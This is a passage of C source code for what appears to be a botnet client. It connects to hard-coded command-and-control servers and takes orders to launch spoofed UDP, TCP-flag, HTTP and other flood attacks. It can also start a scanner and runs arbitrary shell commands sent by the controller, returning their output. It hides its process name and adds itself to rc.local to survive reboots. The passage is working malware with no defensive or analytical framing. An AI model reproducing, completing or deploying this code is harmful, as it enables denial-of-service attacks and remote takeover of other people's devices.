				sockprintf(mainCommSock, "SCAN <threads> <usec> <timeout>");
				return;
			}else{
				int threads = atoi(argv[1]);
                int usec = atoi(argv[2]);
				int timeout = (argc > 3 ? atoi(argv[3]) : 6);
				if(!listFork())
				{
					sockprintf(mainCommSock, "Starting scanner!!");
					StartTheLelz(threads, usec, timeout);
					_exit(0);
				}
				return;
			}
        }

        if(!strcmp(argv[0], "GETLOCALIP"))
        {
                sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
                return;
        }
		
		if(!strcmp(argv[0], "GETPUBLICIP"))
        {
                sockprintf(mainCommSock, "My Public IP: %s", inet_ntoa(ourPublicIP));
                return;
        }
		
		if(!strcmp(argv[0], "VERSION"))
        {
            sockprintf(mainCommSock, "Version: %d.%d",versionnnn,subversionnnn);
            return;
        }
		
		if(!strcmp(argv[0], "RANGE"))
        {
			if(argc < 2 || atoi(argv[1]) == -1){
				sockprintf(mainCommSock, "RANGE <option 0-idk>");
			}else{
				sockprintf(mainCommSock, "Range %d->%d", rangechoice, atoi(argv[1]));
				rangechoice = atoi(argv[1]);
			}
			return;
        }
		
		if(!strcmp(argv[0], "DOUSPOOFBRAH?")){
			int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
            if(!sockfd)
            {
                return;
            }

            int tmp = 1;
            if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
            {
                return;
            }else{
				sockprintf(mainCommSock, "FUK YEA I DO (%s)", inet_ntoa(ourPublicIP));
			}
		}

        if(!strcmp(argv[0], "UDP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65536 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
                {
                        sockprintf(mainCommSock, "UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                int packetsize = atoi(argv[5]);
                int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
				int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
				int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendUDP(hi, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (!listFork()){
							sendUDP(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
							_exit(0);	
						}
                }
				return;
        }

        if(!strcmp(argv[0], "TCP"))
        {
                if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
                {
                        sockprintf(mainCommSock, "TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10) <sleep check> <sleep delay>");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
                int spoofed = atoi(argv[4]);
                unsigned char *flags = argv[5];

                int pollinterval = (argc > 7 ? atoi(argv[7]) : 10);
                int psize = argc > 6 ? atoi(argv[6]) : 0;
				int sleepcheck = (argc > 8 ? atoi(argv[8]) : 1000000);
				int sleeptime = (argc > 9 ? atoi(argv[9]) : 0);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendTCP(hi, port, time, spoofed, flags, psize, pollinterval, sleepcheck, sleeptime);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else	{
                        if (!listFork()) {
						    sendTCP(ip, port, time, spoofed, flags, psize, pollinterval, sleepcheck, sleeptime);
                            _exit(0);	
							}
						}
        }
		if(!strcmp(argv[0], "L7"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
			{
				sockprintf(mainCommSock, "L7 <protocol ip url> <time> <threads> <sleep check> <sleep time(ms)>");
				return;
			}
	
			unsigned char *ip = argv[1];
			int time = atoi(argv[2]);
			int threads = atoi(argv[3]);
			int sleepcheck = (argc > 4 ? atoi(argv[4]) : 1000000);
			int sleeptime = (argc > 5 ? atoi(argv[5]) : 0);
	
			if(strstr(ip, ",") != NULL)
			{
				unsigned char *hi = strtok(ip, ",");
				while(hi != NULL)
				{
					int i = 0;
					while(i < threads){
						if(!listFork())
						{
							sendHTTP(hi, time, sleepcheck, sleeptime);
							close(mainCommSock);
							_exit(0);
						}
						i++;
					}
					hi = strtok(NULL, ",");
				}
			} else{
				int i = 0;
				while(i < threads){
					if(!listFork()){
						sendHTTP(ip, time, sleepcheck, sleeptime);
						close(mainCommSock);
						_exit(0);
					}
					i++;
				}
			}
		}
		
				if(!strcmp(argv[0], "L420"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
			{
				sockprintf(mainCommSock, "L7 <protocol ip url> <time> <threads> <sleep check> <sleep time(ms)>");
				return;
			}
	
			unsigned char *ip = argv[1];
			int time = atoi(argv[2]);
			int threads = atoi(argv[3]);
			int sleepcheck = (argc > 4 ? atoi(argv[4]) : 1000000);
			int sleeptime = (argc > 5 ? atoi(argv[5]) : 0);
			system("mkdir /tmp/yuagwduiagwdhg");
	
			if(strstr(ip, ",") != NULL)
			{
				unsigned char *hi = strtok(ip, ",");
				while(hi != NULL)
				{
					int i = 0;
					while(i < threads){
						if(!listFork())
						{
							sendHTTP2(hi, time, sleepcheck, sleeptime);
							close(mainCommSock);
							sleep(10);
							system("rm -fr /tmp/yuagwduiagwdhg");
							_exit(0);
						}
						i++;
					}
					hi = strtok(NULL, ",");
				}
			} else{
				int i = 0;
				while(i < threads){
					if(!listFork()){
						sendHTTP2(ip, time, sleepcheck, sleeptime);
						close(mainCommSock);
						sleep(10);
						system("rm -fr /tmp/yuagwduiagwdhg");
						_exit(0);
					}
					i++;
				}
			}
		}
		
		if(!strcmp(argv[0], "VIEWPAGE"))
		{
			if(argc < 2){
				sockprintf(mainCommSock, "VIEWPAGE <http ip url>");
                return;
			}else{
				char *url = argv[1];
				char *UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
				system("mkdir /tmp/yuagwduiagwdhg");
				char *command[80];
				sprintf(command,"wget -O /tmp/yuagwduiagwdhg/a -U \"");
				strcat(command, UA);
				strcat(command,"\" -q ");
				strcat(command, url);
				system(command);
				system("rm -fr /tmp/yuagwduiagwdhg");
			}
		}
		
		if(!strcmp(argv[0], "CNC"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
						sockprintf(mainCommSock, "CNC <target> <port> <time> <sleep inbetween> <connect for>");
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);
				int sleepcheck = (argc > 4 ? atoi(argv[4]) : 0);
				int connectfor = (argc > 5 ? atoi(argv[5]) : 1);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendCNC(hi, port, time, sleepcheck, connectfor);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendCNC(ip, port, time, sleepcheck, connectfor);
                        _exit(0);
                }
        }
		
		if(!strcmp(argv[0], "STD"))
		{
			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
            {
                        sockprintf(mainCommSock, "STD <target> <port> <time>");
                        return;
            }
			
			unsigned char *ip = argv[1];
            int port = atoi(argv[2]);
            int time = atoi(argv[3]);
			
			if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        sendSTD(hi, port, time);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        sendSTD(ip, port, time);
                        _exit(0);
                }
			
		}

		if(!strcmp(argv[0], "KILLATTK"))
        {
                int killed = 0;
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                                killed++;
                        }
                }

                if(killed > 0)
                {
                        sockprintf(mainCommSock, "Killed %d.", killed);
                } else {
                        sockprintf(mainCommSock, "None Killed.");
                }
        }

        if(!strcmp(argv[0], "LOLNOGTFO"))
        {
                unsigned long i;
                for (i = 0; i < numpids; i++) {
                        if (pids[i] != 0 && pids[i] != getpid()) {
                                kill(pids[i], 9);
                        }
                }
				close(commServer);
                exit(0);
        }
}

int initConnection()
{
        unsigned char server[4096];
        memset(server, 0, 4096);
        if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
        if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
        else currentServer++;
        szprintf(server, "%d.%d.%d.%d", server_ip1[currentServer],server_ip2[currentServer],server_ip3[currentServer],server_ip4[currentServer]);
		int port = server_port[currentServer];

        mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

        if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

        return 0;
}

int getOurIP()
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock == -1) return 0;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);

        int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
        if(err == -1) return 0;

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr*) &name, &namelen);
        if(err == -1) return 0;

        ourIP.s_addr = name.sin_addr.s_addr;

        int cmdline = open("/proc/net/route", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                if(strstr(linebuf, "\t00000000\t") != NULL)
                {
                        unsigned char *pos = linebuf;
                        while(*pos != '\t') pos++;
                        *pos = 0;
                        break;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);

        if(*linebuf)
        {
                int i;
                struct ifreq ifr;
                strcpy(ifr.ifr_name, linebuf);
                ioctl(sock, SIOCGIFHWADDR, &ifr);
                for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
        }

        close(sock);
}

char *getBuild()
{
	#ifdef MIPS_BUILD
	return "MIPS";
	#elif MIPSEL_BUILD
	return "MIPSEL";
	#elif X86_BUILD
	return "X86";
	#elif ARM_BUILD
	return "ARM";
	#elif PPC_BUILD
	return "POWERPC";
	#else
	return "420BLAZEITFGT";
	#endif
}

int main(int argc, unsigned char *argv[])
{
        char *mynameis = "";
        if(SERVER_LIST_SIZE <= 0) return 0;
		printf("BUILD %s\n", getBuild());
		strncpy(argv[0],"",strlen(argv[0]));
    	argv[0] = "";
    	prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
		srand(time(NULL) ^ getpid());
        init_rand(time(NULL) ^ getpid());
        pid_t pid1;
        pid_t pid2;
        int status;
		int dupthing = 0;
		
		char cwd[256],*str;
        FILE *file;
		str="/etc/rc.d/rc.local";
		file=fopen(str,"r");
		if (file == NULL) {
			str="/etc/rc.conf";
			file=fopen(str,"r");
		}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }

        getOurIP();

        if (pid1 = fork()) {
                        waitpid(pid1, &status, 0);
                        exit(0);
        } else if (!pid1) {
			if (pid2 = fork()) {
				exit(0);
            } else if (!pid2) {
            } else {
				zprintf("fork failed\n");
			}
        } else {
			zprintf("fork failed\n");
        }

        setsid();
        chdir("/");

        signal(SIGPIPE, SIG_IGN);

        while(1)
        {
                if(initConnection()) { sleep(30); continue; }

				sockprintf(mainCommSock, "BUILD %s", getBuild());

                char commBuf[4096];
                int got = 0;
                int i = 0;
                while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
                {
                        for (i = 0; i < numpids; i++) if (waitpid(pids[i], NULL, WNOHANG) > 0) {
                                unsigned int *newpids, on;
                                for (on = i + 1; on < numpids; on++) pids[on-1] = pids[on];
                                pids[on - 1] = 0;
                                numpids--;
                                newpids = (unsigned int*)malloc((numpids + 1) * sizeof(unsigned int));
                                for (on = 0; on < numpids; on++) newpids[on] = pids[on];
                                free(pids);
                                pids = newpids;
                        }

                        commBuf[got] = 0x00;

                        trim(commBuf);

                        if(strstr(commBuf, "PING") == commBuf)
                        {
                                sockprintf(mainCommSock, "PONG");
                                continue;
                        }
                        if(strstr(commBuf, "DUP") == commBuf){
							dupthing++;
							zprintf("aparently im a dupe\n");
							if(dupthing > 20){
								exit(0);
							}
							break;
						}

                        unsigned char *message = commBuf;

                        if(*message == '!')
                        {
                                unsigned char *nickMask = message + 1;
                                while(*nickMask != ' ' && *nickMask != 0x00) nickMask++;
                                if(*nickMask == 0x00) continue;
                                *(nickMask) = 0x00;
                                nickMask = message + 1;

                                message = message + strlen(nickMask) + 2;
                                while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00;

                                unsigned char *command = message;
                                while(*message != ' ' && *message != 0x00) message++;
                                *message = 0x00;
                                message++;

                                unsigned char *tmpcommand = command;
                                while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; }

                                if(strcmp(command, "SH") == 0)
                                {
                                        unsigned char buf[1024];
                                        int command;
                                        if (listFork()) continue;
                                        memset(buf, 0, 1024);
                                        szprintf(buf, "%s 2>&1", message);
                                        command = fdpopen(buf, "r");
                                        while(fdgets(buf, 1024, command) != NULL)
                                        {
                                                trim(buf);
                                                sockprintf(mainCommSock, "%s", buf);
                                                memset(buf, 0, 1024);
                                                sleep(1);
                                        }
                                        fdpclose(command);
                                        exit(0);
                                }

                                unsigned char *params[10];
                                int paramsCount = 1;
                                unsigned char *pch = strtok(message, " ");
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
				sleep(30);
        }

        return 0;
		printf("client exiting");
}